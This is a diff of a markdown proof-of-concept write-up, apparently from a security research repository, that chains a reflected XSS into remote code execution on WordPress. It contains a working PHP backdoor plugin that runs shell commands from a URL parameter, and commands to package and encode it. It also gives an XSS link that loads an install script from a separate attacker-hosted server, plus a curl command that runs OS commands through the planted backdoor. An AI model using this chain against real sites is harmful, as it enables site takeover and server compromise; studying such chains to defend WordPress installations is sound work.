@@ -9,54 +9,73 @@
 * [x] Microsoft Edge Version 122.0.2365.52 (64-bit)
 
 ## Exploitation Steps
+1. [create backdoored CMS module] backdoor source code
 
-1. [create WordPress plugin containing PHP payload] backdoor source code (`WP_PoC.php`)
+    * **NOTE**: update/customize PHP backdoor in `WP_PoC.php`
 
-```
-<?php
-/**
- * Plugin Name: WP RCE PoC - Install Plugin
- * Version: 1.0.0
- * Author: WP Admin
- * Author URI: https://localhost
- * License: GPL2
- */
-if (md5($_GET['pass']) === '098f6bcd4621d373cade4e832627b4f6') { echo passthru($_GET['cmd']); }
-?>
-```
+    (`WP_PoC.php`)
 
-2. [create WordPress plugin containing PHP payload] create WordPress plugin
+    ```
+    <?php
+    /**
+     * Plugin Name: WP RCE PoC - Install Plugin
+     * Version: 1.0.0
+     * Author: WP Admin
+     * Author URI: https://localhost
+     * License: GPL2
+     */
+    if (md5($_GET['pass']) === '098f6bcd4621d373cade4e832627b4f6') { echo passthru($_GET['cmd']); }
+    ?>
+    ```
 
-```
-zip WP_PoC.zip WP_PoC.php
-```
+2. [create backdoored CMS module] create WordPress plugin
 
-3. [create WordPress plugin containing PHP payload] base64-encode generated plugin file (**NOTE**: avoids encoding issues)
+    ```
+    zip WP_PoC.zip WP_PoC.php
+    ```
 
-```
-cat WP_PoC.zip | base64 -w0 > WP_PoC.txt
-```
+3. [create backdoored CMS module] base64-encode generated plugin file (**NOTE**: avoids encoding issues)
 
-4. victim user (with administrative privileges) logs in
+    ```
+    cat WP_PoC.zip | base64 -w0 > WP_PoC.txt
+    ```
 
-http://192.168.5.10/wp-login.php
+4. [setup exploit] change payload variable values (`installPluginWP.js`)
 
-5. victim user clicks link
+    `pluginURL` - URL of WordPress plugin (containing backdoor) to be installed on target site
 
-```
-http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.13/installPluginWP.js></script>
-```
+    `wpRoot` - path to WordPress installation on the target system (e.g. `"/path"`)
 
-6. execute OS command
+5. [setup exploit] setup web server (to serve the payload/plugin)
 
-```
-curl -s "http://192.168.5.10/wp-content/plugins/WP_PoC/WP_PoC.php?pass=test&cmd=id" | head -n 1
-```
+6. [social engineering attack] victim user (with administrative privileges) logs in
 
-7. [optional] uninstall plugin
+    http://192.168.5.10/wp-login.php
 
-*WordPress ➔ Plugins ➔ Installed Plugins ➔ [WP RCE PoC - Install Plugin] Delete ➔ OK*
+7. [social engineering attack] victim user clicks link
+
+    ```
+    http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.13/installPluginWP.js></script>
+    ```
+
+    * **NOTES**:
+      * `192.168.5.10` - target WordPress site
+      * `192.168.5.13` - web server hosting payload
+
+8. [post exploit] execute OS command
+
+    ```
+    curl -s "http://192.168.5.10/wp-content/plugins/WP_PoC/WP_PoC.php?pass=test&cmd=id" | head -n 1
+    ```
+
+    * **NOTE**: module URL constructed based on name of installed module
+
+9. [uninstall module] uninstall module via GUI
+
+    *WordPress ➔ Plugins ➔ Installed Plugins ➔ [WP RCE PoC - Install Plugin] Delete ➔ OK*
 
 ## Screenshots
+
+* **NOTE**: the screenshot covers steps 1 to 8 from the "Exploitation Steps" chapter
 
 ![Image](screenshots/WordPress_-_install_plugin_-_1-1.png)
